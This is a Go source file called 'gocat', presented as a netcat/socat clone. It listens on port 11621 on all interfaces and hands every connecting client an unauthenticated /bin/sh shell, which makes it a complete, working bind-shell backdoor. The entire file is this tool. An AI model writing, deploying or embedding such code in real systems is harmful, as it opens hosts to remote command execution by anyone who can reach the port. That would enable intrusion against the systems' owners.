package main

// Project gocat
// File: main.go
// Author: Matt Weidner <matt.weidner@gmail.com>
// Description: netcat/socat clone
//              current version is listen only,
//              spawns a hardcoded application
//              on client connect.
import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

func handleClient(c net.Conn) {
	CMD := "/bin/sh"
	cmd := exec.Command(CMD)
	sip, e := cmd.StdinPipe()
	if e != nil {
		panic(e)
	}
	defer sip.Close()
	sop, e := cmd.StdoutPipe()
	if e != nil {
		panic(e)
	}
	defer sop.Close()
	sep, e := cmd.StderrPipe()
	if e != nil {
		panic(e)
	}
	defer sep.Close()
	go func() {
		io.Copy(sip, c)
		cmd.Process.Kill()
	}()
	go func() {
		io.Copy(c, sop)
		cmd.Process.Kill()
	}()
	go func() {
		io.Copy(c, sep)
		cmd.Process.Kill()
	}()
	cmd.Run()
}

func main() {
	build := 7
	LHOST := "0.0.0.0"
	LPORT := "11621"
	fmt.Fprintf(os.Stderr, "gocat build %d\n", build)
	fmt.Fprintf(os.Stderr, "Listening on %s:%s\n", LHOST, LPORT)
	l, e := net.Listen("tcp", LHOST+":"+LPORT)
	if e != nil {
		panic(e)
	}
	defer l.Close()
	for {
		c, e := l.Accept()
		log.Println(c.RemoteAddr())
		if e != nil {
			panic(e)
		}
		go handleClient(c)
	}
}
